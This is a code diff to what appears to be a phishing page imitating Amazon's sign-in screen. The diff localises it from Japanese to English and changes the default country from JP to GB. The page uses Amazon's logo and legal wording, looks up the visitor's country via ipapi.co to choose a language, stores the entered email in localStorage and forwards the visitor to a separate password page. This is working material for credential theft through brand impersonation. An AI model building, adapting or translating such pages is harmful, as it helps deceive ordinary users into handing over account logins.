@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon — ログインまたはアカウント作成</title>
+    <title>Amazon — Sign In</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', 'Noto Sans JP', Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
         body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
         .logo { margin: 10px 0 25px; text-align: center; }
         .logo img { height: 60px; }
@@ -34,36 +34,36 @@
 <body>
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
-        <h1 id="judul">ログインまたはアカウント作成</h1>
-        <p class="sub-judul" id="subJudul">携帯電話番号またはメールアドレスを入力</p>
+        <h1 id="judul">Sign in or create account</h1>
+        <p class="sub-judul" id="subJudul">Enter your email or mobile phone number</p>
         
-        <label id="labelEmail" for="email">メールアドレスまたは携帯電話番号</label>
+        <label id="labelEmail" for="email">Email or mobile phone number</label>
         <input type="text" id="email" class="input">
         
         <p id="pesanKosong" class="pesan-merah">
             <span class="ikon-bulat">!</span>
-            <span id="teksKosong">メールアドレスまたは携帯電話番号を入力してください</span>
+            <span id="teksKosong">Enter your email or mobile phone number</span>
         </p>
         <p id="pesanSalah" class="pesan-merah">
             <span class="ikon-bulat">!</span>
-            <span id="teksSalah">無効なアクセスリンクです</span>
+            <span id="teksSalah">Invalid access link</span>
         </p>
         
         <button type="button" id="lanjut" class="tombol">
-            <span id="teksTombol">続行</span>
+            <span id="teksTombol">Continue</span>
         </button>
         
-        <p class="syarat" id="syarat">続行することで、Amazonの<a href="#">利用規約</a>および<a href="#">プライバシー通知</a>に同意するものとします。</p>
+        <p class="syarat" id="syarat">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
         
         <div class="garis-pemisah"></div>
         
-        <p class="bantuan" id="bantuanTeks">お困りですか？<br><a href="#">ヘルプを参照する</a></p>
+        <p class="bantuan" id="bantuanTeks">Need help?<br><a href="#">Learn more</a></p>
         
-        <p class="bisnis" id="bisnisTeks">業務用に購入ですか？<br><a href="#">無料の法人アカウントを作成</a></p>
+        <p class="bisnis" id="bisnisTeks">Buying for work?<br><a href="#">Create a free business account</a></p>
     </div>
     <div class="bawah">
-        <p><a href="#" id="syaratLink1">利用規約</a> <a href="#" id="syaratLink2">プライバシー通知</a> <a href="#" id="bantuanLink">ヘルプ</a></p>
-        <p style="margin-top:8px; color:#767676;" id="hakCiptaan">© 1996-2026, Amazon.com, Inc. またはその関連会社</p>
+        <p><a href="#" id="syaratLink1">Conditions of Use</a> <a href="#" id="syaratLink2">Privacy Notice</a> <a href="#" id="bantuanLink">Help</a></p>
+        <p style="margin-top:8px; color:#767676;" id="hakCiptaan">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
 <script>
@@ -172,15 +172,15 @@ const negaraKeBahasa = {
 // DETEKSI & TERAPKAN BAHASA
 // ==============================================
 async function terapkanBahasa() {
-    let kodeNegara = 'JP';
+    let kodeNegara = 'GB'; // ← DEFAULT: Inggris
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
-        kodeNegara = data.country_code || 'JP';
+        kodeNegara = data.country_code || 'GB';
     } catch {}
 
-    const kodeBahasa = negaraKeBahasa[kodeNegara] || 'JA';
-    const teks = terjemahan[kodeBahasa] || terjemahan.JA;
+    const kodeBahasa = negaraKeBahasa[kodeNegara] || 'EN';
+    const teks = terjemahan[kodeBahasa] || terjemahan.EN;
 
     document.documentElement.lang = kodeBahasa.toLowerCase();
     document.getElementById('judul').textContent = teks.judul;
@@ -206,14 +206,12 @@ const tombolLanjut = document.getElementById('lanjut');
 const pesanKosong = document.getElementById('pesanKosong');
 const pesanSalah = document.getElementById('pesanSalah');
 
-// Saat mengetik → hapus pesan merah
 inputEmail.addEventListener('input', () => {
     inputEmail.classList.remove('salah');
     pesanKosong.style.display = 'none';
     pesanSalah.style.display = 'none';
 });
 
-// Klik tombol → cek & lanjut
 tombolLanjut.addEventListener('click', () => {
     const email = inputEmail.value.trim();
     
@@ -223,10 +221,7 @@ tombolLanjut.addEventListener('click', () => {
         return;
     }
     
-    // Simpan email ke localStorage
     localStorage.setItem('email_pengguna', email);
-    
-    // Langsung ke halaman password
     window.location.href = 'password.html';
 });
 
